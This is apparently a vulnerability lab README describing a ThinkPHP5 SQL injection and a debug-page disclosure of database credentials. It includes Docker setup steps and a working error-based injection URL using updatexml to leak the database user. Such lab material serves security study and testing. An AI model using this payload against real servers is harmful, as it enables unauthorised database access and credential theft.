# ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure

Operating environment:

```
Docker-compose up -d
```

After launching, visit `http://your-ip/index.php?ids[]=1&ids[]=2` to see that the username is displayed, indicating that the environment is running successfully.

## Vulnerability Principle

Explanation of the principle of vulnerability:

- https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html
- https://xianzhi.aliyun.com/forum/read/1813.html

No longer.

## Vulnerability

Access `http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`, the information is successfully popped out:

![](01.png)

Of course, this is a bit of a SQL injection vulnerability. But through the DEBUG page, we found the database account and password:

![](02.png)

This is again a sensitive information disclosure vulnerability.